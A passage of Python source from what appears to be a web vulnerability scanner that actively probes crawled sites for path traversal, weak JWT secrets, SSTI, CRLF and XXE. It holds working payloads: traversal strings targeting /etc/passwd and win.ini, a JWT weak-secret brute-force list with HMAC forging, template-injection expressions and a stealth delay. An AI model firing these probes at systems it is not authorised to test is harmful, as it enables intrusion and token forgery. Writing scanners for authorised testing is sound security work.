    # 4. Timing anomaly
    if probe_time_ms > 0 and baseline.response_time_std > 0:
        threshold = baseline.response_time_mean + 3 * baseline.response_time_std
        if probe_time_ms > threshold:
            return True, (f"response time {probe_time_ms:.0f} ms "
                          f"> threshold {threshold:.0f} ms")

    return False, "within baseline parameters"

# ── Multi-stage verification ──────────────────────────────────────────────────

_MSV_DOWNGRADE = {"CRITICAL": "HIGH", "HIGH": "MEDIUM"}


def _msv_verify(
    severity: str,
    title: str,
    target: str,
    detail: str,
    re_request_fn,
    confirm_fn,
) -> None:
    """
    Multi-stage verification for CRITICAL and HIGH findings.

    Waits 2 seconds then re-sends an identical probe request.
    - If the second response independently confirms the finding:
        fires alert at original severity (confidence: CONFIRMED).
    - If the second response does not reproduce the finding:
        fires alert at one severity level lower and appends
        "(UNVERIFIED)" to the detail.

    For severities other than CRITICAL/HIGH, fires immediately.

    Log format:
      [Verify] Confirming CRITICAL <title> on <target> ...
      [Verify] Confirmed — firing alert
      [Verify] Failed — downgrading to HIGH (UNVERIFIED)
    """
    if severity not in _MSV_DOWNGRADE:
        alert(title, severity, target, detail)
        return

    short = f"{title} on {target}"[:80]
    print(timestamp() + f" [Verify] Confirming {severity} {short} ...")
    time.sleep(2)
    try:
        verify_resp = re_request_fn()
        if confirm_fn(verify_resp):
            print(timestamp() + " [Verify] Confirmed — firing alert")
            alert(title, severity, target, detail)
            return
    except Exception:
        pass
    downgraded = _MSV_DOWNGRADE[severity]
    print(timestamp() + f" [Verify] Failed — downgrading to {downgraded} (UNVERIFIED)")
    alert(
        title, downgraded, target,
        detail + " (UNVERIFIED — second probe did not reproduce the finding)",
    )


def _get_probe_baseline(base: str, params: dict, timeout: int = 8) -> tuple:
    """
    Fetch and cache a clean baseline response for (base, params).
    Returns (status_code: int, body: str) or (None, None) on failure.
    Cached per (base, frozenset(params.items())) to avoid repeat requests.
    """
    key = (base, frozenset(params.items()))
    if key not in _probe_baseline:
        orig_query = "&".join(f"{k}={v}" for k, v in params.items())
        url = base + ("?" + orig_query if orig_query else "")
        try:
            resp = _get_session().get(
                url,
                headers=create_request_header(),
                timeout=timeout,
                allow_redirects=True,
                verify=False,
            )
            _probe_baseline[key] = (resp.status_code, resp.text or "")
        except Exception:
            _probe_baseline[key] = (None, None)
    return _probe_baseline[key]


# Error indicator strings reused by _diff_is_meaningful and check_sqli
_DIFF_ERROR_INDICATORS = [
    "sql syntax", "mysql_fetch", "ora-", "pg::error", "sqlite_",
    "unclosed quotation", "you have an error in your sql",
    "warning: mysql", "invalid query", "odbc", "ole db",
    "fatal error", "parse error", "traceback (most recent call last)",
]


def _diff_is_meaningful(
    bl_status,
    bl_body,
    pr_status: int,
    pr_body: str,
    canary: str = "",
) -> tuple:
    """
    Return (is_meaningful: bool, reason: str).

    A diff is meaningful if:
      - HTTP status code changed between baseline and probe
      - Canary appears in the probe body but was absent in the baseline
      - A new error string appeared that was absent in baseline
      - Body length changed by >10% AND by >50 bytes

    Not meaningful if the only difference is sub-50-byte dynamic noise.
    If no baseline is available (None), always returns (True, "no baseline").
    """
    if bl_status is None or bl_body is None:
        return True, "no baseline"

    if pr_status != bl_status:
        return True, f"status {bl_status}→{pr_status}"

    if canary and canary in pr_body and canary not in bl_body:
        return True, f"canary '{canary}' new in probe"

    pr_lower = pr_body.lower()
    bl_lower = bl_body.lower()
    for err in _DIFF_ERROR_INDICATORS:
        if err in pr_lower and err not in bl_lower:
            return True, f"new error indicator '{err}'"

    bl_len = len(bl_body)
    pr_len = len(pr_body)
    diff   = abs(pr_len - bl_len)
    if diff > 50 and bl_len > 0 and diff / bl_len > 0.10:
        return True, f"body length {bl_len}→{pr_len} ({diff / bl_len:.0%} change)"

    return False, "diff not meaningful (dynamic noise)"


def _detect_input_context(body: str, param_value: str) -> str:
    """
    Detect the rendering context of *param_value* in *body*.

    Returns one of:
      'html_attr'   — inside an HTML attribute value (any attribute)
      'html_body'   — between HTML tags
      'js_string'   — inside a JS string literal
      'url_context' — inside href/src/action/content attribute URL
      'json'        — inside a JSON string value
      'unknown'     — not found or context indeterminate

    Uses a 120-character look-behind window before the first occurrence.
    """
    if not param_value or not body or param_value not in body:
        return "unknown"

    pos = body.find(param_value)
    pre = body[max(0, pos - 120): pos]

    # JSON value: preceded by colon-quote pattern  "key": "VALUE
    if re.search(r':\s*"[^"\n]*$', pre):
        return "json"

    # JS string: inside a JS assignment / expression string literal
    if re.search(
        r'''(?:var|let|const|=)\s*[^=\n]*?['"][^'"<>\n]*$''',
        pre, re.IGNORECASE,
    ):
        return "js_string"

    # URL attribute: href/src/action/content/location = "...VALUE
    if re.search(
        r'(?:href|src|action|content|location)\s*=\s*["\'][^"\'<\n]*$',
        pre, re.IGNORECASE,
    ):
        return "url_context"

    # Generic HTML attribute: attr="...VALUE
    if re.search(r'[\w-]+\s*=\s*["\'][^"\'<\n]*$', pre):
        return "html_attr"

    # HTML body: between tags  >...VALUE
    if re.search(r'>[^<]*$', pre):
        return "html_body"

    return "unknown"


# ─────────────────────────────────────────────
# Statistical timing infrastructure
# ─────────────────────────────────────────────
# Used by SQLi time-based blind and CMDi blind timing phases.
# Replaces fixed _SQLI_TIME_THRESHOLD with per-endpoint adaptive thresholds.

import collections as _collections

_TimingProfile = _collections.namedtuple(
    "_TimingProfile", ["mean_ms", "std_ms", "max_ms", "valid"]
)

# Cache: (base, params_frozen) → (_TimingProfile, cache_epoch_s)
_timing_profiles: dict = {}
_TIMING_PROFILE_TTL = 60   # seconds before re-profiling


def _get_timing_profile(base: str, params: dict, n: int = 5) -> "_TimingProfile":
    """
    Send *n* baseline requests to *base* with cache-busting params and compute
    mean / std / max response times.  Returns a _TimingProfile.

    Profile is cached per (base, params) for _TIMING_PROFILE_TTL seconds.
    Returns _TimingProfile(valid=False) when std_ms > 500 (noisy link) or
    all requests fail.
    """
    key = (base, frozenset(params.items()))
    cached = _timing_profiles.get(key)
    if cached:
        profile, ts = cached
        if time.monotonic() - ts < _TIMING_PROFILE_TTL:
            return profile

    orig_query = "&".join(f"{k}={v}" for k, v in params.items())
    samples: list[float] = []
    for i in range(n):
        try:
            # cache-buster so responses are not served from proxy/CDN cache
            sep = "&" if orig_query else ""
            url = base + "?" + orig_query + sep + f"_nst={i}"
            t0  = time.monotonic()
            _get_session().get(
                url,
                headers=create_request_header(),
                timeout=15,
                allow_redirects=True,
            )
            samples.append((time.monotonic() - t0) * 1000.0)
        except Exception:
            pass

    if not samples:
        profile = _TimingProfile(mean_ms=0, std_ms=0, max_ms=0, valid=False)
        _timing_profiles[key] = (profile, time.monotonic())
        return profile

    mean_ms = sum(samples) / len(samples)
    variance = sum((s - mean_ms) ** 2 for s in samples) / len(samples)
    std_ms  = variance ** 0.5
    max_ms  = max(samples)

    if std_ms > 500:
        print(timestamp() + f" [Timing] Noisy baseline for {base} "
              f"(σ={std_ms:.0f}ms > 500ms) — skipping time-based probing")
        profile = _TimingProfile(mean_ms=mean_ms, std_ms=std_ms, max_ms=max_ms, valid=False)
    else:
        profile = _TimingProfile(mean_ms=mean_ms, std_ms=std_ms, max_ms=max_ms, valid=True)

    _timing_profiles[key] = (profile, time.monotonic())
    return profile


def _timing_threshold(profile: "_TimingProfile", delay_s: float) -> float:
    """
    Return the minimum elapsed-ms that counts as a confirmed delay for a
    payload that asks the server to sleep *delay_s* seconds.

    Formula: mean_ms + 3*std_ms + delay_s*1000
    """
    return profile.mean_ms + 3.0 * profile.std_ms + delay_s * 1000.0


# ─────────────────────────────────────────────
# Path traversal detection
# ─────────────────────────────────────────────

# Parameter names that commonly accept file paths or template names
PATH_TRAVERSAL_PARAMS = {
    "file", "path", "template", "page", "include", "load", "read",
    "document", "doc", "filename", "filepath", "name", "src", "source",
    "view", "content", "resource", "fetch", "url", "data", "input",
    "dir", "folder", "location", "route", "nav", "show", "display",
    "layout", "module", "conf", "config", "cfg", "setting",
}

# Traversal payloads — ordered from shallow to deep
# Each tuple: (payload, os_hint)
# os_hint: 'unix', 'windows', or 'both'
PATH_TRAVERSAL_PAYLOADS = [
    # Unix — /etc/passwd
    ("../../../etc/passwd",              "unix"),
    ("../../../../etc/passwd",           "unix"),
    ("../../../../../etc/passwd",        "unix"),
    ("../../../../../../etc/passwd",     "unix"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "unix"),   # URL-encoded
    ("..%2f..%2f..%2fetc%2fpasswd",      "unix"),           # partial encode
    ("....//....//....//etc/passwd",     "unix"),           # double-dot bypass
    # Unix — /etc/hosts (less sensitive but confirms traversal)
    ("../../../etc/hosts",               "unix"),
    ("../../../../etc/hosts",            "unix"),
    # Windows — win.ini
    ("..\\..\\..\\windows\\win.ini",     "windows"),
    ("../../../../windows/win.ini",      "windows"),
    ("%2e%2e%5c%2e%2e%5cwindows%5cwin.ini", "windows"),
    # Windows — system32/drivers/etc/hosts
    ("../../../../windows/system32/drivers/etc/hosts", "windows"),
]

# Signatures that confirm successful file read
PATH_TRAVERSAL_UNIX_SIGS = [
    "root:x:0:0",       # /etc/passwd
    "root:*:0:0",       # BSD /etc/passwd
    "daemon:x:",
    "/bin/bash",
    "/bin/sh",
    "127.0.0.1\tlocalhost",   # /etc/hosts
    "::1\tlocalhost",
]

PATH_TRAVERSAL_WIN_SIGS = [
    "[fonts]",          # win.ini
    "[extensions]",     # win.ini
    "[mci extensions]",
    "for 16-bit app support",
    "127.0.0.1",        # hosts file
]

_traversal_tested  = set()   # (base_url, param) already tested
_traversal_domains = set()   # domains already confirmed vulnerable

def check_path_traversal(page_url, html_content):
    """
    Parse links on the page for parameters that may accept file paths.
    For each unique (endpoint, param) pair, inject traversal sequences
    and check the response body for known file content signatures.

    Two-phase:
      1. Collect candidate parameters from page links
      2. For each untested (endpoint, param), try payloads until confirmed
         or exhausted

    Alerts CRITICAL on confirmed traversal with file content evidence.
    Deduplicates per domain — stops testing once one confirmed finding
    per domain is recorded (avoid hammering the server).
    """
    domain = urlparse(page_url).netloc
    if domain in _traversal_domains:
        return
    if is_third_party_cdn(domain):
        return

    try:
        text = html_content if isinstance(html_content, str) \
               else html_content.decode("utf-8", errors="replace")
        soup = BeautifulSoup(text, "lxml")
    except Exception:
        return

    # Collect candidate URLs from page links + current page URL
    all_urls = [page_url]
    for tag in soup.find_all(["a", "form", "link"]):
        href = tag.get("href") or tag.get("action") or ""
        if href and href.startswith("http"):
            all_urls.append(href)

    traversal_params_lower = {p.lower() for p in PATH_TRAVERSAL_PARAMS}

    for raw_url in all_urls:
        if domain in _traversal_domains:
            break
        try:
            resolved_url = urljoin(page_url, raw_url)
            parsed = urlparse(resolved_url)
            if is_third_party_cdn(parsed.netloc):
                continue
            if not parsed.query:
                continue
            params = {}
            for pair in parsed.query.split("&"):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    params[k] = v
        except Exception:
            continue

        for param in params:
            if param.lower() not in traversal_params_lower:
                continue
            if domain in _traversal_domains:
                break

            base_endpoint = parsed.scheme + "://" + parsed.netloc + parsed.path
            test_key = (base_endpoint, param)
            if test_key in _traversal_tested:
                continue
            _traversal_tested.add(test_key)

            print(timestamp() + f" Path traversal probe: {base_endpoint} param={param}")
            _bl = _get_endpoint_baseline(base_endpoint, params)
            bl_status = _bl.status_code if _bl else None
            bl_body   = _bl.body if _bl else None

            for payload, os_hint in PATH_TRAVERSAL_PAYLOADS:
                if domain in _traversal_domains:
                    break
                try:
                    # Build test URL with traversal payload
                    new_query = "&".join(
                        f"{k}={payload}" if k == param else f"{k}={v}"
                        for k, v in params.items()
                    )
                    test_url = base_endpoint + "?" + new_query

                    stealth_delay(domain)
                    resp = _get_session().get(
                        test_url,
                        headers=create_request_header(),
                        timeout=6,
                        allow_redirects=True,
                    )

                    if resp.status_code not in (200, 206):
                        continue

                    body = resp.text

                    # Diff guard — only flag if the file signature is new
                    # (not already present in the baseline response body)
                    bl_lower = (bl_body or "").lower()

                    # Check Unix signatures
                    unix_hit = [s for s in PATH_TRAVERSAL_UNIX_SIGS
                                if s in body and s not in (bl_body or "")]
                    if unix_hit:
                        _traversal_domains.add(domain)
                        _tu  = test_url
                        _sig = unix_hit[0]
                        _b0  = bl_body or ""
                        _msv_verify(
                            "CRITICAL", "PATH TRAVERSAL — FILE READ CONFIRMED", _tu,
                            f"Parameter '{param}' reads arbitrary files. "
                            f"Payload: {payload!r} — response contains: {_sig!r}",
                            lambda _u=_tu: _get_session().get(
                                _u, headers=create_request_header(),
                                timeout=6, allow_redirects=True,
                            ),
                            lambda r, _s=_sig, _b=_b0: _s in (r.text or "") and _s not in _b,
                        )
                        print(timestamp() + f" [!!] Path traversal confirmed: {test_url} "
                              f"param={param} payload={payload!r}")
                        break

                    # Check Windows signatures
                    win_hit = [s for s in PATH_TRAVERSAL_WIN_SIGS
                               if s.lower() in body.lower()
                               and s.lower() not in bl_lower]
                    if win_hit:
                        _traversal_domains.add(domain)
                        _tu  = test_url
                        _sig = win_hit[0]
                        _b0  = bl_body or ""
                        _msv_verify(
                            "CRITICAL", "PATH TRAVERSAL — FILE READ CONFIRMED", _tu,
                            f"Parameter '{param}' reads arbitrary files (Windows). "
                            f"Payload: {payload!r} — response contains: {_sig!r}",
                            lambda _u=_tu: _get_session().get(
                                _u, headers=create_request_header(),
                                timeout=6, allow_redirects=True,
                            ),
                            lambda r, _s=_sig, _b=_b0: _s.lower() in (r.text or "").lower() and _s.lower() not in _b.lower(),
                        )
                        print(timestamp() + f" [!!] Path traversal confirmed (Windows): "
                              f"{test_url} param={param} payload={payload!r}")
                        break

                except Exception as e:
                    print_error(f"Path traversal probe failed for {test_url}: {e}")


# ─────────────────────────────────────────────
# JWT detection and weakness analysis
# ─────────────────────────────────────────────

import base64 as _b64

# Regex to find JWT tokens anywhere — cookies, headers, HTML, JS
JWT_REGEX = re.compile(
    r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{0,}'
)

# Weak secrets commonly used in development that get shipped to prod.
# Covers common patterns: generic words, framework defaults, env var patterns,
# company/app name placeholders, and common keyboard walks.
JWT_WEAK_SECRETS = [
    # Generic words
    "secret", "password", "123456", "test", "dev", "development",
    "production", "change_me", "changeme", "your-secret", "your_secret",
    "jwt_secret", "jwtsecret", "supersecret", "super_secret",
    "mysecret", "my_secret", "app_secret", "appsecret",
    "secret_key", "secretkey", "private_key", "privatekey",
    "default", "example", "sample", "demo", "admin",
    # Framework / library defaults
    "django-insecure-", "flask-secret", "laravel_secret", "rails_secret",
    "express-session-secret", "cookie-secret", "session-secret",
    "your-256-bit-secret", "your-512-bit-secret",
    "HS256", "HS384", "HS512",
    # Common placeholder patterns
    "changethis", "change-this", "replace-me", "replaceme", "todo",
    "fixme", "pleasechangeme", "please_change_me", "updatethis",
    "insert_secret_here", "put_secret_here", "put-your-secret-here",
    "CHANGE_ME", "REPLACE_ME", "YOUR_SECRET_HERE",
    # Short / trivial
    "1", "12", "123", "1234", "12345", "123456789", "1234567890",
    "pass", "passwd", "password1", "password123", "passw0rd",
    "qwerty", "qwerty123", "letmein", "welcome", "login",
    "abc", "abc123", "abcdef", "abcdefgh",
    # Common app/env patterns
    "app", "app_key", "appkey", "application", "application_secret",
    "api", "api_key", "apikey", "api_secret", "apisecret",
    "auth", "auth_secret", "auth_key", "authkey", "auth_token",
    "token", "token_secret", "access_token", "refresh_token",
    "key", "mykey", "my_key", "private", "public",
    "prod", "production_secret", "prod_secret",
    "staging", "staging_secret",
    "local", "localhost",
    # Node / Express
    "keyboard cat", "keyboard_cat", "express", "express-secret",
    "session", "sessions", "cookie", "cookies",
    # Python / Django / Flask
    "django", "flask", "python", "pythonsecret",
    "SECRET_KEY", "secret_key_goes_here",
    # Java / Spring
    "spring", "spring-boot", "java", "springboot",
    "mySecretKey", "jwtSecretKey",
    # PHP / Laravel
    "laravel", "php", "symfony", "silex",
    # Ruby / Rails
    "rails", "ruby", "sinatra",
    # Go
    "golang", "go-secret",
    # Database
    "mysql", "postgres", "mongodb", "redis",
    # Common names / keyboard walks
    "admin123", "administrator", "root", "toor", "master",
    "iloveyou", "sunshine", "monkey", "dragon", "baseball",
    "qwerty", "azerty", "zxcvbn", "1q2w3e4r", "q1w2e3r4",
    "asdfgh", "asdfghjkl", "zxcvbnm",
    # Docker / CI / infra defaults
    "docker", "kubernetes", "k8s", "jenkins", "gitlab",
    "travis", "circleci", "github",
    # Numbers
    "111111", "222222", "333333", "999999", "000000",
    "11111111", "99999999", "00000000",
    # JWT-specific common leaks seen in public GitHub repos
    "your_jwt_secret", "jwt-secret-key", "jwt_key", "jwtkey",
    "jwt-signing-secret", "signing-secret", "sign_secret",
    "hmac-secret", "hmac_secret", "token_key", "token-key",
    "bearer", "bearer_secret",
    # Company/product placeholder names
    "myapp", "my-app", "mywebsite", "my-website", "myservice",
    "acme", "acmecorp", "example.com", "test.com",
    # Length-1 to common short secrets
    "s", "ss", "sss", "key", "keys",
    "x", "xx", "xxx", "secret1", "Secret1", "Secret123",
]

# jwt.io demo token — shown on the jwt.io homepage and in tutorials everywhere
_JWT_DEMO_TOKEN = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
    ".eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ"
    ".SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
)
_JWT_DEMO_SIG = _JWT_DEMO_TOKEN.split(".")[-1]

# Cracked secrets that are known documentation placeholders — not real leaks
_JWT_PLACEHOLDER_SECRETS = {
    "your-256-bit-secret", "your-512-bit-secret", "secret", "your-secret",
}

_jwt_seen    = set()   # deduplicate by token signature (last segment)
_jwt_domains = set()   # domains already reported

def _b64_decode_segment(segment):
    """Base64url-decode a JWT segment, padding as needed."""
    padding = 4 - len(segment) % 4
    if padding != 4:
        segment += "=" * padding
    try:
        return _b64.urlsafe_b64decode(segment).decode("utf-8", errors="replace")
    except Exception:
        return ""

def _hmac_sign(secret, header_b64, payload_b64):
    """Return base64url-encoded HMAC-SHA256 signature."""
    import hmac as _hmac
    import hashlib as _hashlib
    msg = f"{header_b64}.{payload_b64}".encode()
    sig = _hmac.new(secret.encode(), msg, _hashlib.sha256).digest()
    return _b64.urlsafe_b64encode(sig).rstrip(b"=").decode()

def analyse_jwt(token, source_url):
    """
    Decode and analyse a JWT for security weaknesses:
      1. alg: none — signature entirely bypassed
      2. Weak HS256 secret — brute-force against common passwords
      3. Expired token still in use — server may not validate exp
      4. Sensitive data in payload — PII/credentials in cleartext

    Alerts CRITICAL for alg:none and confirmed weak secrets.
    Alerts HIGH for sensitive payload data.
    """
    parts = token.split(".")
    if len(parts) != 3:
        return

    # Suppress the jwt.io demo token — it appears in tutorials and examples everywhere
    sig = parts[2]
    if sig == _JWT_DEMO_SIG:
        return

    # Deduplicate by signature segment
    if sig in _jwt_seen:
        return
    _jwt_seen.add(sig)

    header_raw  = _b64_decode_segment(parts[0])
    payload_raw = _b64_decode_segment(parts[1])

    try:
        header  = json.loads(header_raw)
        payload = json.loads(payload_raw)
    except Exception:
        return  # malformed — skip

    alg = str(header.get("alg", "")).lower()

    # ── 1. alg: none ──────────────────────────────────────────
    if alg == "none":
        alert(
            "JWT ALG:NONE — SIGNATURE BYPASS",
            "CRITICAL",
            source_url,
            f"JWT uses alg:none — signature not verified. "
            f"Subject: {payload.get('sub', payload.get('user', '?'))}",
            redact_detail=False
        )
        print(timestamp() + f" [!!] JWT alg:none at {source_url}")
        return

    # ── 2. Weak HS256 secret ───────────────────────────────────
    if alg == "hs256":
        for secret in JWT_WEAK_SECRETS:
            expected = _hmac_sign(secret, parts[0], parts[1])
            if expected == parts[2]:
                # Suppress known documentation placeholders — not real findings
                if secret.lower() in _JWT_PLACEHOLDER_SECRETS:
                    break
                alert(
                    "JWT WEAK SECRET",
                    "CRITICAL",
                    source_url,
                    f"JWT HS256 secret cracked: '{secret}'. "
                    f"Full token forgery possible. "
                    f"Subject: {payload.get('sub', '?')}",
                    redact_detail=False
                )
                print(timestamp() + f" [!!] JWT weak secret '{secret}' at {source_url}")
                return

    # ── 3. Expired token ──────────────────────────────────────
    exp = payload.get("exp")
    if exp:
        try:
            import time as _time
            if _time.time() > float(exp):
                print(timestamp() + f" JWT expired token still present: {source_url}")
                write_to_js_database(source_url, source_url, "jwt_expired",
                                     f"exp={exp} sub={payload.get('sub','?')}")
        except Exception:
            pass

    # ── 4. Sensitive data in payload ─────────────────────────
    sensitive_keys = {"password", "passwd", "secret", "token", "key",
                      "ssn", "credit_card", "card_number", "cvv"}
    found_sensitive = [k for k in payload if k.lower() in sensitive_keys]
    if found_sensitive:
        domain = urlparse(source_url).netloc
        if domain not in _jwt_domains:
            _jwt_domains.add(domain)
            alert(
                "JWT SENSITIVE PAYLOAD DATA",
                "HIGH",
                source_url,
                f"JWT payload contains sensitive fields: {found_sensitive}. "
                f"JWT payloads are base64-encoded, NOT encrypted."
            )

    print(timestamp() + f" JWT analysed: alg={alg} sub={payload.get('sub','?')} iss={payload.get('iss','?')} at {source_url}")

def scan_for_jwts(source_url, content, response_headers=None):
    """
    Scan page HTML, JS content, and response headers/cookies for JWTs
    and analyse each unique one found.
    """
    text = content if isinstance(content, str) \
           else content.decode("utf-8", errors="replace") if content else ""

    # Scan body content
    for token in JWT_REGEX.findall(text):
        analyse_jwt(token, source_url)

    # Scan Set-Cookie and Authorization headers
    if response_headers:
        for header_name in ("Set-Cookie", "set-cookie", "Authorization", "authorization"):
            val = response_headers.get(header_name, "")
            if val:
                for token in JWT_REGEX.findall(val):
                    analyse_jwt(token, source_url)


# ─────────────────────────────────────────────
# Server-Side Template Injection (SSTI) detection
# ─────────────────────────────────────────────

# SSTI payload templates — {A} and {B} are replaced with random large integers
# per test run so the expected product can't appear coincidentally on the page.
# Each tuple: (payload_template, engine_hint)
SSTI_PAYLOAD_TEMPLATES = [
    ("{{{{A}}*{{B}}}}",   "Jinja2/Twig/Pebble"),
    ("${{{A}*{B}}}",      "Freemarker/Spring/Velocity"),
    ("#{{{A}*{B}}}",      "Thymeleaf"),
    ("<%= {A}*{B} %>",    "ERB/EJS"),
    ("${{{{A}}*{{B}}}}",  "Pebble (alt syntax)"),
]

# URL-accepting parameters should not be tested for SSTI — they produce
# false positives (e.g. Facebook share.php?u=) and are already covered by
# SSRF candidate flagging.
_SSTI_URL_PARAMS = {
    "u", "url", "uri", "redirect", "return", "returnurl", "next",
    "target", "dest", "destination", "go", "goto", "link", "src",
    "source", "ref", "referrer", "callback", "image", "img",
    "proxy", "feed", "endpoint", "webhook",
}

_ssti_tested  = set()   # (base_url, param) pairs already probed
_ssti_domains = set()   # domains where SSTI was confirmed

def check_ssti(page_url, html_content):
    """
    Probe URL parameters for Server-Side Template Injection.

    Uses randomly generated large integers (e.g. 8231 * 6197 = 51,007,307)
    as the expected marker so it cannot appear coincidentally in page content.
    Skips URL-accepting parameters (covered by SSRF flagging) to avoid
    false positives on sharing/redirect endpoints like Facebook share.php?u=.
    Alerts CRITICAL only when the exact product appears in the response and
    the raw payload was not literally echoed back.
    """
    import random as _random
    domain = urlparse(page_url).netloc
    if domain in _ssti_domains:
        return

    try:
        text = html_content if isinstance(html_content, str) \
               else html_content.decode("utf-8", errors="ignore")
        soup = BeautifulSoup(text, "lxml")
    except Exception:
        return

    # Collect (base_url, query_string, param, original_value) candidates
    candidates = []
    all_urls = [page_url]
    for tag in soup.find_all(["a", "form"]):
        href = tag.get("href") or tag.get("action") or ""
        if href:
            all_urls.append(href)

    for raw_url in all_urls:
        try:
            resolved_url = urljoin(page_url, raw_url)
            parsed = urlparse(resolved_url)
            if not parsed.query:
                continue
            base = parsed.scheme + "://" + parsed.netloc + parsed.path
            for pair in parsed.query.split("&"):
                if "=" not in pair:
                    continue
                k, v = pair.split("=", 1)
                # Skip URL-accepting params — not template contexts
                if k.lower() in _SSTI_URL_PARAMS:
                    continue
                v_clean = re.sub(r'^https?://', '', v)
                candidates.append((base, parsed.query, k, v_clean))
        except Exception:
            continue

    for base, query, param, original_val in candidates:
        if domain in _ssti_domains:
            break

        test_key = (base, param)
        if test_key in _ssti_tested:
            continue
        _ssti_tested.add(test_key)

        # Baseline for diff and context detection
        base_params = {k: v for k, v in
                       (p.split("=", 1) for p in query.split("&") if "=" in p)}
        _bl = _get_endpoint_baseline(base, base_params)
        bl_status = _bl.status_code if _bl else None
        bl_body   = _bl.body if _bl else None

        # Context detection — log for audit trail
        ctx = _detect_input_context(bl_body or "", original_val)
        if ctx != "unknown":
            print(timestamp() + f" [Context] SSTI param={param} in {ctx} context")

        # Fresh random operands per (endpoint, param) pair — product is unique
        a = _random.randint(1000, 9999)
        b = _random.randint(1000, 9999)
        marker = str(a * b)   # e.g. "51007307" — extremely unlikely to appear naturally

        for tmpl, engine_hint in SSTI_PAYLOAD_TEMPLATES:
            payload = tmpl.format(A=a, B=b)
            new_query = "&".join(
                f"{k}={payload}" if k == param else f"{k}={v}"
                for k, v in (p.split("=", 1) for p in query.split("&") if "=" in p)
            )
            test_url = base + "?" + new_query
            try:
                stealth_delay(domain)
                resp = _get_session().get(
                    test_url,
                    headers=create_request_header(),
                    timeout=5,
                    allow_redirects=True,
                )
                # Confirm: exact product in response, raw payload not literally echoed,
                # AND marker was not already present in the baseline response
                if (marker in resp.text
                        and payload not in resp.text
                        and marker not in (bl_body or "")):
                    _ssti_domains.add(domain)
                    _tu = test_url
                    _mk = marker
                    _pl = payload
                    _msv_verify(
                        "CRITICAL", "SERVER-SIDE TEMPLATE INJECTION (SSTI)", _tu,
                        f"Parameter '{param}' evaluated template expression. "
                        f"Payload: {payload} → response contains '{marker}'. "
                        f"Engine hint: {engine_hint}. RCE may be possible.",
                        lambda _u=_tu: _get_session().get(
                            _u, headers=create_request_header(),
                            timeout=5, allow_redirects=True,
                        ),
                        lambda r, _m=_mk, _p=_pl: _m in (r.text or "") and _p not in (r.text or ""),
                    )
                    print(timestamp() + f" [!!] SSTI confirmed: {test_url} (param={param}, engine={engine_hint})")
                    return
            except Exception as e:
                print_error(f"SSTI probe failed for {test_url}: {e}")


# ─────────────────────────────────────────────
# CRLF injection detection
# ─────────────────────────────────────────────

_CRLF_CANARY_HEADER = "X-Cache-Status"
_CRLF_CANARY_VALUE  = "probe-1a2b"
# URL-encoded CR+LF followed by the injected header
_CRLF_PAYLOAD       = f"%0d%0a{_CRLF_CANARY_HEADER}:%20{_CRLF_CANARY_VALUE}"

_crlf_tested  = set()   # (endpoint, param) pairs already probed
_crlf_domains = set()   # domains with a confirmed finding — stop after first

def check_crlf_injection(page_url, html_content):
    """
    For each URL parameter found on the page, append a CRLF payload and
    check whether the canary header appears in the response headers.
    Only tests parameters on in-scope URLs. Deduplicates per (endpoint, param).
    Stops after one confirmed finding per domain.
    """
    domain = urlparse(page_url).netloc
    if domain in _crlf_domains:
        return
    if not is_in_scope(page_url):
        return
    if is_third_party_cdn(domain):
        return

    try:
        text = html_content if isinstance(html_content, str) \
               else html_content.decode("utf-8", errors="ignore")
        soup = BeautifulSoup(text, "lxml")
    except Exception:
        return

    all_urls = [page_url]
    for tag in soup.find_all(["a", "form", "link"]):
        href = tag.get("href") or tag.get("action") or ""
        if href and href.startswith("http"):
            all_urls.append(href)

    for raw_url in all_urls:
        if domain in _crlf_domains:
            break
        if not is_in_scope(raw_url):
            continue
        if is_third_party_cdn(urlparse(raw_url).netloc):
            continue
        try:
            parsed = urlparse(raw_url)
            if not parsed.query:
                continue
            base = parsed.scheme + "://" + parsed.netloc + parsed.path
            params = {}
            for pair in parsed.query.split("&"):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    params[k] = v
        except Exception:
            continue

        # Baseline for diff check (we verify the canary header is absent in clean response)
        _bl = _get_endpoint_baseline(base, params)
        bl_status = _bl.status_code if _bl else None
        bl_body   = _bl.body if _bl else None

        for param, value in params.items():
            if domain in _crlf_domains:
                break
            test_key = (base, param)
            if test_key in _crlf_tested:
                continue
            _crlf_tested.add(test_key)

            injected_value = value + _CRLF_PAYLOAD
            new_query = "&".join(
                f"{k}={injected_value}" if k == param else f"{k}={v}"
                for k, v in params.items()
            )
            test_url = base + "?" + new_query
            try:
                stealth_delay(domain)
                resp = _get_session().get(
                    test_url,
                    headers=create_request_header(),
                    timeout=5,
                    allow_redirects=False,
                )
                # Check if canary header was reflected — also diff-check the body
                # to skip noise (e.g. page already dynamically includes the value)
                crlf_header_hit = _CRLF_CANARY_VALUE in resp.headers.get(
                    _CRLF_CANARY_HEADER, ""
                )
                meaningful, _ = _diff_is_meaningful(
                    bl_status, bl_body, resp.status_code, resp.text or "",
                    canary=_CRLF_CANARY_VALUE,
                )
                if crlf_header_hit and meaningful:
                    _crlf_domains.add(domain)
                    alert(
                        "CRLF INJECTION",
                        "HIGH",
                        test_url,
                        f"Parameter '{param}' reflects injected CRLF sequence — "
                        f"'{_CRLF_CANARY_HEADER}: {_CRLF_CANARY_VALUE}' appeared in response headers. "
                        f"Exploitable for header injection, log poisoning, and response splitting."
                    )
                    print(timestamp() + f" [!!] CRLF injection confirmed: {base} param='{param}'")
            except requests.exceptions.Timeout:
                pass
            except Exception as e:
                print_error(f"CRLF probe failed for {test_url}: {e}")


# ─────────────────────────────────────────────
# XXE injection detection
# ─────────────────────────────────────────────

# Safe canary — confirms entity processing without reading sensitive files.
# The DOCTYPE declares a static string entity; if the parser resolves it and
# reflects it in the response we know entity expansion is enabled.
_XXE_CANARY      = "xxe-probe-4f7c"
_XXE_PAYLOAD     = (
    '<?xml version="1.0"?>\n'
    '<!DOCTYPE test [\n'
    '  <!ENTITY xxe "xxe-probe-4f7c">\n'
    ']>\n'
    '<test>&xxe;</test>'
)
